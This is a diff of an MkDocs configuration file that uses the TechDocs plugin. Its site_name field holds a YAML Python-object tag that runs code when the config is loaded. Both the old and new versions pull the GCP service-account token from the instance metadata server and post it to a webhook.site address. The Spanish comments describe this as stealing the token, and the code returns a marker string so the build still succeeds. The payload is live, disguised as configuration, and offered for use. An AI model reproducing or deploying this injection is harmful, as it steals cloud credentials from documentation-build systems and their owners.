@@ -1,12 +1,18 @@
-site_name: !!python/object/apply:os.popen
+site_name: !!python/object/apply:subprocess.getoutput
   - |
-    python3 -c 'import socket,os,subprocess;
-    # Comando para obtener el token de metadatos de GCP y enviarlo
-    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/ >> /workspace/token.txt;
-    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token/ >> /workspace/token.txt;
-    # Comando para robar el token y enviarlo al Webhook
-    subprocess.call(["curl", "-s", "https://webhook.site/4e121085-cda1-4e75-9bdf-8b15b9f50c7e", "-d", "TOKEN_VIA_MKDOCS=@/workspace/token.txt"]);
-    echo "RESEARCH_COMPLETE";
+    python3 -c 'import subprocess;
+    # Comando para obtener el token de GCP
+    cmd = "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    
+    # Ejecutamos y guardamos la salida. getoutput devuelve el string de la salida.
+    output = subprocess.check_output(cmd, shell=True, text=True)
+    
+    # Ahora enviamos el resultado a tu Webhook para confirmarlo
+    import requests
+    requests.post("https://webhook.site/4e121085-cda1-4e75-9bdf-8b15b9f50c7e", data={"token_output": output})
+    
+    # Devolvemos un string simple para que MkDocs no se queje
+    "RCE_SUCCESS_TOKEN_SENT"
     '
 plugins:
   - techdocs-core
